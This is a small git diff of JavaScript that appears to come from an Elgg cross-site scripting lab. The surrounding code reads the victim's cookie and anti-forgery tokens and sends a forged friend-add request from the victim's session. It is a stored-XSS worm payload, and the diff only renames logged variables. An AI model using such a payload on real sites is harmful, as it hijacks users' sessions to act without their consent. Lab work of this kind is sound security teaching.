@@ -8,7 +8,7 @@ let target_id = document.getElementsByClassName("photo u-photo")[0].src.substr(1
 let cookie = document.cookie;
 let me = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].alt;
 let my_id = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].src.substr(104, 2);
-console.log("samy_id = " + samy_id);
+console.log("target_id = " + target_id);
 console.log("cookie = " + cookie);
 console.log("__elgg_ts = " + __elgg_ts);
 console.log("__elgg_token = " + __elgg_token);
@@ -20,7 +20,7 @@ if (my_id != target_id) {
 	var Ajax1=null;
 	Ajax1=new XMLHttpRequest();
 	let http_url1 = "http://www.xsslabelgg.com/action/friends/add?friend="+target_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
-	console.log(http_url);
+	console.log(http_url1);
 	Ajax1.open("POST",http_url1,true);
 	Ajax1.setRequestHeader("Host","www.xsslabelgg.com");
 	Ajax1.setRequestHeader("Keep-Alive","300");
